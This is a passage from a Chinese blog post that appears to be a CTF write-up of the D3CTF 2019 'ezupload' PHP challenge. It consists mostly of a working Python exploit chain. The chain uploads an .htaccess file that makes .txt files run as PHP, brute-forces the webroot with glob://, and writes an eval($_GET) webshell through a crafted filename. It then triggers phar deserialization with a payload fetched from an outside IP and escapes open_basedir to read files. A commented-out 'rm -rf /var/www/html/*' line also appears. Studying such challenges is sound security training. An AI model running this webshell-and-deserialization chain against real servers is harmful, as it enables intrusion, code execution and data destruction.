class="line"></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'poc_from_lou00'</span>&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.220.154:8001/'</span></span><br><span class="line"></span><br><span class="line">webroot=<span class="string">''</span></span><br><span class="line">upload=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">3</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'action'</span>:<span class="string">'upload'</span>,</span><br><span class="line">        <span class="string">'url'</span>:<span class="string">'http://192.168.220.157:8302/php_file/1'</span>,</span><br><span class="line">        <span class="string">'filename'</span>: str(i)</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url,data=data,headers=headers)</span><br><span class="line">    upload = r.text.split(<span class="string">'upload/'</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">'[*] upload  is '</span> + upload)</span><br><span class="line"></span><br><span class="line">temp = <span class="string">'1234567890abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> temp:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'action'</span>:<span class="string">'count'</span>,</span><br><span class="line">            <span class="string">'url'</span>:<span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'filename'</span>:<span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'dir'</span>:<span class="string">'glob:///var/www/html/'</span>+webroot + i+<span class="string">'*/upload/'</span>+upload+<span class="string">'/*'</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"don't"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            webroot += i</span><br><span class="line">            print(webroot)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'[*] webroot is '</span> + webroot)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'action'</span>:<span class="string">'upload'</span>,</span><br><span class="line">    <span class="string">'url'</span>:<span class="string">'http://192.168.220.157:8302/php_file/1'</span>,</span><br><span class="line">    <span class="string">'filename'</span>: <span class="string">'.htaccess'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'action'</span>:<span class="string">'upload'</span>,</span><br><span class="line">    <span class="string">'url'</span>:<span class="string">'http://192.168.220.157:8302/php_file/1'</span>,</span><br><span class="line">    <span class="string">'filename'</span>: <span class="string">'&lt;?php echo 1.1;eval($_GET["a"]);'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data=data,headers=headers)</span><br><span class="line">print(webroot,upload)</span><br><span class="line">php = <span class="string">'''&lt;?php</span></span><br><span class="line"><span class="string">class dir&#123;</span></span><br><span class="line"><span class="string">    public $userdir;</span></span><br><span class="line"><span class="string">    public $url;</span></span><br><span class="line"><span class="string">    public $filename;</span></span><br><span class="line"><span class="string">    public function __construct($usedir,$url,$filename)&#123;</span></span><br><span class="line"><span class="string">	$this-&gt;userdir = $usedir;</span></span><br><span class="line"><span class="string">	$this-&gt;url = $url;</span></span><br><span class="line"><span class="string">	$this-&gt;filename = $filename;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$a = new dir('upload/%s','','');</span></span><br><span class="line"><span class="string">$b = new dir($a,'','/var/www/html/%s/upload/%s/2');</span></span><br><span class="line"><span class="string">$phar = new Phar("phar.phar");</span></span><br><span class="line"><span class="string">$phar-&gt;startBuffering();</span></span><br><span class="line"><span class="string">$phar-&gt;setStub("__HALT_COMPILER();?&gt;;");</span></span><br><span class="line"><span class="string">$phar-&gt;setMetadata($b);</span></span><br><span class="line"><span class="string">$phar-&gt;addFromString("test.txt", "test");</span></span><br><span class="line"><span class="string">$phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="string">echo urlencode(serialize($b));'''</span>%(upload,webroot,upload)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'phar.php'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(php)</span><br><span class="line">print(<span class="string">'[*] your file phar.php is create'</span>)</span><br><span class="line">os.popen(<span class="string">'php phar.php'</span>,<span class="string">'r'</span>,<span class="number">1</span>)</span><br><span class="line">os.popen(<span class="string">'mv phar.phar /etc/nginx/php_file'</span>)</span><br><span class="line">print(<span class="string">'[*] your file phar.phar is create'</span>)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'action'</span>:<span class="string">'upload'</span>,</span><br><span class="line">    <span class="string">'url'</span>:<span class="string">'http://192.168.220.157:8302/php_file/phar.phar'</span>,</span><br><span class="line">    <span class="string">'filename'</span>: <span class="string">'1.jpg'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data=data,headers=headers)</span><br><span class="line">print(<span class="string">'[*] your file phar.phar is upload'</span>)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'action'</span>:<span class="string">'upload'</span>,</span><br><span class="line">    <span class="string">'url'</span>:<span class="string">'phar://upload/'</span>+upload+<span class="string">'/1.jpg'</span>,</span><br><span class="line">    <span class="string">'filename'</span>: <span class="string">'2.jpg'</span></span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">'[*] shell is in upload/'</span>+upload+<span class="string">'/2.txt'</span>)</span><br><span class="line"></span><br><span class="line">r = requests.post(url,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = requests.get(url+<span class="string">'upload/'</span>+upload+<span class="string">'/2.txt?a=chdir(%27..%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);var_dump(file_get_contents(%27F1aG_1s_H4r4%27));'</span>,headers=headers)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.popen('rm -rf /var/www/html/*')</span></span><br><span class="line"><span class="comment"># print('[*] your file is delate')</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="从赛后官方给的docker环境中我们可以看到有如下两限制："><a href="#从赛后官方给的docker环境中我们可以看到有如下两限制：" class="headerlink" title="从赛后官方给的docker环境中我们可以看到有如下两限制："></a>从赛后官方给的docker环境中我们可以看到有如下两限制：</h6><h6 id="目录限制："><a href="#目录限制：" class="headerlink" title="目录限制："></a>目录限制：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir = /var/www/html</span><br></pre></td></tr></table></figure>
+
+<h6 id="系统函数限制："><a href="#系统函数限制：" class="headerlink" title="系统函数限制："></a>系统函数限制：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">disable_functions = system,</span><br><span class="line">shell_exec,passthru,exec,popen,</span><br><span class="line">proc_open,pcntl_exec,mail,putenv,</span><br><span class="line">apache_setenv,mb_send_mail,dl,set_time_limit,</span><br><span class="line">ignore_user_abort,symlink,link,error_log</span><br></pre></td></tr></table></figure>
+
+<h6 id="但是没有禁用glob因此我们可以用它来匹配文件，例如："><a href="#但是没有禁用glob因此我们可以用它来匹配文件，例如：" class="headerlink" title="但是没有禁用glob因此我们可以用它来匹配文件，例如："></a>但是没有禁用glob因此我们可以用它来匹配文件，例如：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dir=scandir(<span class="string">'glob://i*x.php'</span>);</span><br><span class="line">print_r($dir);</span><br></pre></td></tr></table></figure>
+
+<h6 id="结果如下："><a href="#结果如下：" class="headerlink" title="结果如下："></a>结果如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; index.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h6 id="我们根据这个payload来进行分析："><a href="#我们根据这个payload来进行分析：" class="headerlink" title="我们根据这个payload来进行分析："></a>我们根据这个payload来进行分析：</h6><h6 id="第一步我们要上传一个-htaccess的文件因为后文要把它解析为php文件。"><a href="#第一步我们要上传一个-htaccess的文件因为后文要把它解析为php文件。" class="headerlink" title="第一步我们要上传一个.htaccess的文件因为后文要把它解析为php文件。"></a>第一步我们要上传一个<code>.htaccess</code>的文件因为后文要把它解析为<code>php</code>文件。</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'htaccess'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">'AddHandler php7-script .txt\n'</span>)</span><br><span class="line">print(<span class="string">'[*] your file htaccess is create'</span>)</span><br><span class="line">os.popen(<span class="string">'mv htaccess /var/www/html/1'</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'poc_from_lou00'</span>&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.220.154:8001/'</span></span><br><span class="line"></span><br><span class="line">webroot=<span class="string">''</span></span><br><span class="line">upload=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">3</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'action'</span>:<span class="string">'upload'</span>,</span><br><span class="line">        <span class="string">'url'</span>:<span class="string">'http://118.24.3.214/1'</span>,</span><br><span class="line">        <span class="string">'filename'</span>: str(i)</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url,data=data,headers=headers)</span><br><span class="line">    upload = r.text.split(<span class="string">'upload/'</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">'[*] upload  is '</span> + upload)</span><br></pre></td></tr></table></figure>
+
+<h6 id="第二步爆破出webroot，方便后面的文件写入："><a href="#第二步爆破出webroot，方便后面的文件写入：" class="headerlink" title="第二步爆破出webroot，方便后面的文件写入："></a>第二步爆破出<code>webroot</code>，方便后面的文件写入：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">temp = <span class="string">'1234567890abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> temp:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'action'</span>:<span class="string">'count'</span>,</span><br><span class="line">            <span class="string">'url'</span>:<span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'filename'</span>:<span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'dir'</span>:<span class="string">'glob:///var/www/html/'</span>+webroot + i+<span class="string">'*/upload/'</span>+upload+<span class="string">'/*'</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"don't"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            webroot += i</span><br><span class="line">            print(webroot)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'[*] webroot is '</span> + webroot)</span><br></pre></td></tr></table></figure>
+
+<h6 id="第三步上传webshell文件，这里主要是为了在反序列化时包含文件名作为webshell。"><a href="#第三步上传webshell文件，这里主要是为了在反序列化时包含文件名作为webshell。" class="headerlink" title="第三步上传webshell文件，这里主要是为了在反序列化时包含文件名作为webshell。"></a>第三步上传webshell文件，这里主要是为了在反序列化时包含文件名作为webshell。</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'action'</span>:<span class="string">'upload'</span>,</span><br><span class="line">    <span class="string">'url'</span>:<span class="string">'http://118.24.3.214/1'</span>,</span><br><span class="line">    <span class="string">'filename'</span>: <span class="string">'.htaccess'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'action'</span>:<span class="string">'upload'</span>,</span><br><span class="line">    <span class="string">'url'</span>:<span class="string">'http://118.24.3.214/1'</span>,</span><br><span class="line">    <span class="string">'filename'</span>: <span class="string">'&lt;?php echo 1.1;eval($_GET["a"]);'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data=data,headers=headers)</span><br></pre></td></tr></table></figure>
+
+<h6 id="第四步我们Phar协议来反序列化，触发文件名的包含。"><a href="#第四步我们Phar协议来反序列化，触发文件名的包含。" class="headerlink" title="第四步我们Phar协议来反序列化，触发文件名的包含。"></a>第四步我们<code>Phar</code>协议来反序列化，触发文件名的包含。</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">php = <span class="string">'''&lt;?php</span></span><br><span class="line"><span class="string">class dir&#123;</span></span><br><span class="line"><span class="string">    public $userdir;</span></span><br><span class="line"><span class="string">    public $url;</span></span><br><span class="line"><span class="string">    public $filename;</span></span><br><span class="line"><span class="string">    public function __construct($usedir,$url,$filename)&#123;</span></span><br><span class="line"><span class="string">	$this-&gt;userdir = $usedir;</span></span><br><span class="line"><span class="string">	$this-&gt;url = $url;</span></span><br><span class="line"><span class="string">	$this-&gt;filename = $filename;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$a = new dir('upload/%s','','');</span></span><br><span class="line"><span class="string">$b = new dir($a,'','/var/www/html/%s/upload/%s/2');</span></span><br><span class="line"><span class="string">$phar = new Phar("phar.phar");</span></span><br><span class="line"><span class="string">$phar-&gt;startBuffering();</span></span><br><span class="line"><span class="string">$phar-&gt;setStub("__HALT_COMPILER();?&gt;;");</span></span><br><span class="line"><span class="string">$phar-&gt;setMetadata($b);</span></span><br><span class="line"><span class="string">$phar-&gt;addFromString("test.txt", "test");</span></span><br><span class="line"><span class="string">$phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="string">echo urlencode(serialize($b));'''</span>%(upload,webroot,upload)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'phar.php'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(php)</span><br><span class="line">print(<span class="string">'[*] your file phar.php is create'</span>)</span><br><span class="line">os.popen(<span class="string">'php phar.php'</span>,<span class="string">'r'</span>,<span class="number">1</span>)</span><br><span class="line">os.popen(<span class="string">'mv phar.phar /var/www/html'</span>)</span><br><span class="line">print(<span class="string">'[*] your file phar.phar is create'</span>)</span><br></pre></td></tr></table></figure>
+
+<h6 id="第五步我们上传shell文件："><a href="#第五步我们上传shell文件：" class="headerlink" title="第五步我们上传shell文件："></a>第五步我们上传shell文件：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'action'</span>:<span class="string">'upload'</span>,</span><br><span class="line">    <span class="string">'url'</span>:<span class="string">'http://118.24.3.214/phar.phar'</span>,</span><br><span class="line">    <span class="string">'filename'</span>: <span class="string">'1.jpg'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data=data,headers=headers)</span><br><span class="line">print(<span class="string">'[*] your file phar.phar is upload'</span>)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'action'</span>:<span class="string">'upload'</span>,</span><br><span class="line">    <span class="string">'url'</span>:<span class="string">'phar://upload/'</span>+upload+<span class="string">'/1.jpg'</span>,</span><br><span class="line">    <span class="string">'filename'</span>: <span class="string">'2.jpg'</span></span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">'[*] shell is in upload/'</span>+upload+<span class="string">'/2.txt'</span>)</span><br><span class="line"></span><br><span class="line">r = requests.post(url,data=data,headers=headers)</span><br></pre></td></tr></table></figure>
+
+<h6 id="最后绕过open-basedir"><a href="#最后绕过open-basedir" class="headerlink" title="最后绕过open_basedir:"></a>最后绕过open_basedir:</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(url+<span class="string">'upload/'</span>+upload+<span class="string">'/2.txt?a=chdir(%27..%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);var_dump(file_get_contents(%27F1aG_1s_H4r4%27));'</span>,headers=headers)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.popen('rm -rf /var/www/html/*')</span></span><br><span class="line"><span class="comment"># print('[*] your file is delate')</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h5><h6 id="https-www-anquanke-com-post-id-193939-h3-7"><a href="#https-www-anquanke-com-post-id-193939-h3-7" class="headerlink" title="https://www.anquanke.com/post/id/193939#h3-7"></a><a href="https://www.anquanke.com/post/id/193939#h3-7" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193939#h3-7</a></h6><h6 id="https-hexo-imagemlt-xyz-post-php-bypass-open-basedir"><a href="#https-hexo-imagemlt-xyz-post-php-bypass-open-basedir" class="headerlink" title="https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/"></a><a href="https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/" target="_blank" rel="noopener">https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/</a></h6><h6 id="https-paper-seebug-org-680"><a href="#https-paper-seebug-org-680" class="headerlink" title="https://paper.seebug.org/680/"></a><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></h6>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/08/2019inCTF的images-and-words的环境搭建到解决详细过程/" rel="next" title="2019inCTF的images-and-words的环境搭建到解决详细过程">
+                <i class="fa fa-chevron-left"></i> 2019inCTF的images-and-words的环境搭建到解决详细过程
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-ezupload"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 ezupload</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#题目的环境"><span class="nav-number">1.1.1.</span> <span class="nav-text">题目的环境</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-github-com-Lou00-d3ctf-2019-ezupload"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">https://github.com/Lou00/d3ctf_2019_ezupload</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面是根据官方的wp来写的。"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">下面是根据官方的wp来写的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#题目一开始就给了源代码："><span class="nav-number">1.1.1.3.</span> <span class="nav-text">题目一开始就给了源代码：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#预期解"><span class="nav-number">1.1.2.</span> <span class="nav-text">预期解</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#通过审计代码可以发现存在反序列化漏洞-可以任意文件写入"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">通过审计代码可以发现存在反序列化漏洞,可以任意文件写入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是如果是用相对路径的话-发现无法写入"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">但是如果是用相对路径的话,发现无法写入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在析构函数中工作目录可能会变"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">在析构函数中工作目录可能会变</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#官方给的测试代码如下："><span class="nav-number">1.1.2.4.</span> <span class="nav-text">官方给的测试代码如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#意思是要找到绝对路径"><span class="nav-number">1.1.2.5.</span> <span class="nav-text">意思是要找到绝对路径</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#所以第一部分的payload是"><span class="nav-number">1.1.2.6.</span> <span class="nav-text">所以第一部分的payload是</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通过爆破得到路径-然而非了"><span class="nav-number">1.1.2.7.</span> <span class="nav-text">通过爆破得到路径(然而非了</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#得到路径后就可以通过文件名写shell了"><span class="nav-number">1.1.2.8.</span> <span class="nav-text">得到路径后就可以通过文件名写shell了</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#构造类似与下面的文件名"><span class="nav-number">1.1.2.9.</span> <span class="nav-text">构造类似与下面的文件名</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#构造反序列化"><span class="nav-number">1.1.2.10.</span> <span class="nav-text">构造反序列化</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上传后通过file-get-contents触发"><span class="nav-number">1.1.2.11.</span> <span class="nav-text">上传后通过file_get_contents触发</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#然后就会发现一个带有-lt-的txt文件"><span class="nav-number">1.1.2.12.</span> <span class="nav-text">然后就会发现一个带有&lt;?的txt文件</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最后上传一个-htaccess文件"><span class="nav-number">1.1.2.13.</span> <span class="nav-text">最后上传一个.htaccess文件</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#内容为"><span class="nav-number">1.1.2.14.</span> <span class="nav-text">内容为</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#即可解析php"><span class="nav-number">1.1.2.15.</span> <span class="nav-text">即可解析php</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最后是bypass-open-basedir"><span class="nav-number">1.1.2.16.</span> <span class="nav-text">最后是bypass open_basedir</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面是官方提供的payload"><span class="nav-number">1.1.2.17.</span> <span class="nav-text">下面是官方提供的payload</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#从赛后官方给的docker环境中我们可以看到有如下两限制："><span class="nav-number">1.1.2.18.</span> <span class="nav-text">从赛后官方给的docker环境中我们可以看到有如下两限制：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#目录限制："><span class="nav-number">1.1.2.19.</span> <span class="nav-text">目录限制：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#系统函数限制："><span class="nav-number">1.1.2.20.</span> <span class="nav-text">系统函数限制：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是没有禁用glob因此我们可以用它来匹配文件，例如："><span class="nav-number">1.1.2.21.</span> <span class="nav-text">但是没有禁用glob因此我们可以用它来匹配文件，例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结果如下："><span class="nav-number">1.1.2.22.</span> <span class="nav-text">结果如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们根据这个payload来进行分析："><span class="nav-number">1.1.2.23.</span> <span class="nav-text">我们根据这个payload来进行分析：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第一步我们要上传一个-htaccess的文件因为后文要把它解析为php文件。"><span class="nav-number">1.1.2.24.</span> <span 